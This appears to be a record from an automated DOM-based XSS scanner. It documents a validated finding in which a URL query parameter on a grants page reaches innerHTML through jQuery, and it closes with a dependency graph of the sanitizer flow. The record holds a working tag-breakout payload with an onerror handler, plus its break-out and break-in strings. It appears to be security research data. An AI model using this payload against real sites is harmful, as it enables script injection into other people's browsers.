// Finding: 604b2cb0-f360-4341-8c36-439fb13fedab
// Finding.url: https://example71.com/grants/awarded-grants?field_recipient_type[Other+Initiatives]=O</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('a0564d97982f48168e00d700656f13a6')><!--/*+Initiatives&field_fiscal_year_text[1]=1
// Finding.parentloc: https://example71.com/grants/awarded-grants?field_recipient_type[Other+Initiatives]=O</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('a0564d97982f48168e00d700656f13a6')><!--/*+Initiatives&field_fiscal_year_text[1]=1
// Finding.domain: example71.com
// Finding.base_domain: example71.com
// Finding.source: location.search
// Finding.sink: innerHTML
// Sanitizer.score: 1
// Sanitizer.name: <synthetic>
// Sanitizer.location: example18.com
// Finding.begin: 175
// Finding.end: 201
// Finding.original_uuid: 6a23646e-4364-4f45-b540-673702d99429
// Finding.TwentyFiveMillionFlowsId: -1215430247
// Finding.script: https://example71.com/core/assets/vendor/jquery/jquery.min.js?v=3.5.1
// Finding.line: 2
// Exploit.uuid: a0564d97-982f-4816-8e00-d700656f13a6
// Exploit.success: true
// Exploit.status: validated
// Exploit.method: C
// Exploit.type: html
// Exploit.token: text
// Exploit.content: O
// Exploit.quote_type: None
// Exploit.tag: None
// Exploit.break_out: O</iframe></style></script></object></embed></textarea><img src=x onerror=
// Exploit.break_in: ><!--/*
// Exploit.payload: O</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
// Exploit.begin_taint_url: 79
// Exploit.end_taint_url: 84
// Exploit.replace_begin_url: 79
// Exploit.replace_end_url: 84
// Exploit.replace_begin_param: 25
// Exploit.replace_end_param: 30
// Issues.LargestEncodeAttrStringChain: 0
// Issues.LargestTextFragmentEncodeChainLength: 0
// Issues.HasApproximation: false
// Issues.HasMissingImplementation: false
// Issues.HasInfiniteRegexWithFunctionReplacer: false
// Issues.MergedSplitAndJoins: true
// Issues.HasUrlInRhsOfReplace: false
// Issues.HasUrlInLhsOfReplace: false
// Issues.HasCookieValueInLhsOfreplace: false
// Issues.HasCookieValueInRhsOfreplace: false
// Issues.HasCookieValueInMatchPattern: false
// Issues.HasCookieValueInExecPattern: false
// Issues.RemovedLRConcats: false
// Issues.RemovedReplaceArtifacts: false
// Issues.HasUrlInMatchPattern: false
// Issues.HasUrlInExecPattern: false
// Issues.RemovedNOPreplaces: false
// Issues.Known_sanitizer: false
// DepGraph.hash: 780164585
// DepGraph.sanitizer_hash: 2104548178
// Merged split and join statements 
digraph cfg {
n0 [shape=house, label="Input: x"];
n1 [shape=ellipse, label="decodeURIComponent"];
n2 [shape=box, label="Var: x"];
n3 [shape=ellipse, label="url_params_key"];
n4 [shape=box, label="Lit: field_recipient_type[Other Initiatives]"];
n5 [shape=box, label="Var: x"];
n6 [shape=ellipse, label="preg_replace"];
n7 [shape=box, label="RegExp: /[ ]/"];
n8 [shape=box, label="Lit: -"];
n9 [shape=box, label="Var: x"];
n10 [shape=box, label="Var: x"];
n11 [shape=doubleoctagon, label="Return: x"];
n2 -> n0;
n1 -> n2;
n5 -> n1;
n3 -> n4;
n3 -> n5;
n9 -> n3;
n6 -> n7;
n6 -> n8;
n6 -> n9;
n10 -> n6;
n11 -> n10;
}